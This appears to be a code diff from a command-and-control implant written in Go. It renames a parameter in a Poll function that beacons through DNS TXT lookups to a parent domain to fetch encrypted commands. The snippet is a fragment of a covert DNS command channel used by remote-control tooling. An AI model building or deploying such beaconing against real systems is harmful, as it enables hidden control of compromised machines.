@@ -353,13 +353,13 @@ func SendEnvelope(parentDomain string, sessionID string, sessionKey cryptography
 
 // --------------------------- DNS SESSION RECV ---------------------------
 // Poll - Poll the server for new commands
-func Poll(parentDomain string, sessionID string, sessionKey cryptography.AESKey, pollInterval time.Duration, ctrl chan bool, recv chan *pb.Envelope) {
+func Poll(parentDomain string, sessionID string, sessionKey cryptography.AESKey, pollTimeout time.Duration, ctrl chan bool, recv chan *pb.Envelope) {
 	error_counter := 0
 	for {
 		select {
 		case <-ctrl:
 			return
-		case <-time.After(pollInterval):
+		case <-time.After(pollTimeout):
 			nonce := dnsNonce(nonceStdSize)
 			domain := fmt.Sprintf("_%s.%s.%s.%s", nonce, sessionID, sessionPollingMsg, parentDomain)
 			txt, err := dnsLookup(domain)
